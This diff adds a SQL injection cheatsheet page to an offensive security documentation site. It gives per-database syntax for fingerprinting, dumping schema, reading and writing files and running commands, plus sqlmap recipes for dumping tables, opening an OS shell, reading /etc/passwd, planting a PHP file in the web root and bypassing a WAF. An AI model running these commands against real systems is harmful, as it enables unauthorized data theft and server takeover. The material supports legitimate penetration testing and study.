@@ -1,0 +1,178 @@
+---
+title: DBMS Syntax Cheatsheet
+description: Per-DBMS quick reference for common SQLi syntax, functions, and tricks.
+mitre: [T1190, T1213]
+d3fend: [D3-MH]
+impact: [DataExfil]
+owasp: [A05]
+sidebar:
+  order: 13
+  label: DBMS cheatsheet
+---
+import { Aside } from '@astrojs/starlight/components';
+
+Quick lookup for "I know I'm on Oracle, how do I do X?". For workflow and explanations see the per-technique pages.
+
+<Aside type="tip">
+Keep this page open in a tab during exploitation. The most common time-waster in SQLi is using MySQL syntax against PostgreSQL or vice versa.
+</Aside>
+
+## Fingerprinting (return value identifies the DBMS)
+
+```sql
+SELECT @@version              -- MySQL, MSSQL
+SELECT version()              -- PostgreSQL, MySQL
+SELECT banner FROM v$version  -- Oracle
+SELECT sqlite_version()       -- SQLite
+```
+
+## Common functions
+
+| Operation | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
+|---|---|---|---|---|---|
+| Version | `@@version` | `version()` | `@@version` | `(SELECT banner FROM v$version)` | `sqlite_version()` |
+| Current user | `user()` / `current_user()` | `current_user` | `SYSTEM_USER` / `USER_NAME()` | `USER` | n/a |
+| Current DB | `database()` | `current_database()` | `DB_NAME()` | n/a (uses schemas) | n/a |
+| Hostname | `@@hostname` | `inet_server_addr()` | `@@SERVERNAME` | `SYS_CONTEXT('USERENV','HOST')` | n/a |
+| String concat | `CONCAT(a,b)` | `a \|\| b` | `a + b` | `a \|\| b` | `a \|\| b` |
+| Substring | `SUBSTRING(s,p,l)` | `SUBSTR(s,p,l)` | `SUBSTRING(s,p,l)` | `SUBSTR(s,p,l)` | `SUBSTR(s,p,l)` |
+| String length | `LENGTH(s)` | `LENGTH(s)` | `LEN(s)` | `LENGTH(s)` | `LENGTH(s)` |
+| Char from code | `CHAR(N)` | `CHR(N)` | `CHAR(N)` | `CHR(N)` | `CHAR(N)` |
+| ASCII of char | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` | `UNICODE(c)` |
+| String → hex | `HEX(s)` | `encode(s,'hex')` | `master.dbo.fn_varbintohexstr(s)` | `RAWTOHEX(s)` | `hex(s)` |
+| Hex → string | `UNHEX(h)` | `decode(h,'hex')` | n/a | `UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW(h))` | n/a |
+| Conditional | `IF(c,t,f)` | `CASE WHEN c THEN t ELSE f END` | `IIF(c,t,f)` or `CASE` | `CASE WHEN c THEN t ELSE f END` | `CASE WHEN c THEN t ELSE f END` |
+| Sleep | `SLEEP(n)` | `pg_sleep(n)` | `WAITFOR DELAY '0:0:n'` | `dbms_pipe.receive_message(('a'),n)` | (no native) |
+
+## Comments
+
+| DBMS | Line | Block |
+|---|---|---|
+| MySQL | `-- ` (with space) or `#` | `/* ... */`, `/*! ... */` versioned |
+| PostgreSQL | `-- ` | `/* ... */` |
+| MSSQL | `-- ` | `/* ... */` |
+| Oracle | `-- ` | `/* ... */` |
+| SQLite | `-- ` | `/* ... */` |
+
+URL-safe form: `-- -` (trailing dash so the comment doesn't break on space stripping).
+
+## Limit and offset
+
+| DBMS | Get rows N to M |
+|---|---|
+| MySQL / PostgreSQL / SQLite | `LIMIT M OFFSET N` |
+| MSSQL (2012+) | `OFFSET N ROWS FETCH NEXT M ROWS ONLY` |
+| MSSQL (older) | `SELECT TOP M * FROM t WHERE id NOT IN (SELECT TOP N id FROM t)` |
+| Oracle | `WHERE ROWNUM <= M AND ROWNUM > N` (or row_number() window) |
+
+## Schema enumeration
+
+| Operation | MySQL | PostgreSQL | MSSQL | Oracle |
+|---|---|---|---|---|
+| List databases | `SELECT schema_name FROM information_schema.schemata` | `SELECT datname FROM pg_database` | `SELECT name FROM sys.databases` | n/a (use schemas) |
+| List tables | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` | `SELECT tablename FROM pg_tables WHERE schemaname='public'` | `SELECT name FROM sysobjects WHERE xtype='U'` | `SELECT table_name FROM all_tables` |
+| List columns | `SELECT column_name FROM information_schema.columns WHERE table_name='<T>'` | same as MySQL | same as MySQL | `SELECT column_name FROM all_tab_columns WHERE table_name='<T>'` |
+
+See [Enumeration](../enumeration/) for the full workflow.
+
+## Stacked query support (multiple statements separated by `;`)
+
+| DBMS | Stacked queries via SQLi |
+|---|---|
+| MySQL | Usually not (most drivers disable it) - exception: `mysqli_multi_query` |
+| PostgreSQL | Yes |
+| MSSQL | Yes |
+| Oracle | No (single statement) |
+| SQLite | Depends on driver |
+
+<Aside type="caution">
+When stacked queries don't work, you cannot run `INSERT`, `UPDATE`, `DELETE`, or DDL via injection - only `SELECT`-equivalent primitives.
+</Aside>
+
+## Read & write files
+
+| DBMS | Read | Write | Write requires |
+|---|---|---|---|
+| MySQL | `LOAD_FILE('/path')` | `SELECT ... INTO OUTFILE '/path'` | `FILE` privilege + `secure_file_priv` permits path |
+| PostgreSQL | `pg_read_file('/path', 0, N)` | `COPY (SELECT '...') TO '/path'` | superuser |
+| MSSQL | `OPENROWSET(BULK '/path', SINGLE_CLOB)` | via `xp_cmdshell` | sysadmin |
+| Oracle | `UTL_FILE.GET_LINE(...)` | `UTL_FILE.PUT_LINE(...)` | DBA + directory object |
+| SQLite | n/a | `ATTACH DATABASE 'path/x.php' AS x; CREATE TABLE x.t (c TEXT); INSERT INTO x.t VALUES ('<?php ... ?>')` | filesystem write to web root |
+
+See [File operations](../file-operations/) for full workflow including web shell drops.
+
+## Command execution
+
+| DBMS | Path | Privilege required |
+|---|---|---|
+| MySQL | UDF abuse via `lib_mysqludf_sys` (rare modern systems) | `FILE` privilege + writable plugin dir |
+| PostgreSQL | `COPY ... TO PROGRAM 'cmd'` | superuser |
+| PostgreSQL | `CREATE EXTENSION` + dynamic library | superuser |
+| MSSQL | `EXEC xp_cmdshell 'cmd'` | sysadmin (must enable first) |
+| MSSQL | `sp_OACreate` + WSH | sysadmin |
+| Oracle | Java stored procedures | DBA |
+| Oracle | `DBMS_SCHEDULER` to run OS commands | DBA + appropriate roles |
+| SQLite | n/a (no built-in command execution) | - |
+
+## sqlmap quick flags
+
+```bash
+# Basic dump
+sqlmap -u "https://<TARGET>/p?id=1" --batch --dump
+
+# Specific DBMS, specific technique, specific table
+sqlmap -u "https://<TARGET>/p?id=1" --dbms=mysql --technique=BEUSTQ --dump -T users
+
+# From saved Burp request
+sqlmap -r request.txt --batch --dbs
+
+# With cookies
+sqlmap -u "https://<TARGET>/p?id=1" --cookie="session=xyz" --dump
+
+# JSON body
+sqlmap -u "https://<TARGET>/api/x" --data='{"id":"1*"}' --headers="Content-Type: application/json"
+
+# Mark injection point manually
+sqlmap -u "https://<TARGET>/p?id=1*&other=2"  # asterisk = injection point
+
+# OS shell when DB user is privileged
+sqlmap -u "https://<TARGET>/p?id=1" --os-shell
+
+# Read file
+sqlmap -u "https://<TARGET>/p?id=1" --file-read=/etc/passwd
+
+# Write file
+sqlmap -u "https://<TARGET>/p?id=1" --file-write=local.php --file-dest=/var/www/html/x.php
+
+# Tamper for WAF bypass
+sqlmap -u "https://<TARGET>/p?id=1" --tamper=between,randomcase,space2comment
+
+# Verbose, show all requests
+sqlmap -u "https://<TARGET>/p?id=1" -v 3
+```
+
+`--technique` letters:
+- `B` - boolean blind
+- `E` - error-based
+- `U` - UNION-based
+- `S` - stacked queries
+- `T` - time-based blind
+- `Q` - inline query
+
+## Common ports
+
+| DBMS | Default port |
+|---|---|
+| MySQL / MariaDB | 3306 |
+| PostgreSQL | 5432 |
+| MSSQL | 1433 |
+| Oracle | 1521 |
+| MongoDB | 27017 |
+| Redis | 6379 |
+| Cassandra | 9042 |
+
+Useful when you have direct DB access (not via injection) - different reference, but worth keeping nearby.
+
+## Notes
+
+- This page is a quick lookup, not a tutorial. The technique pages explain *why*; this page is *what to type*.
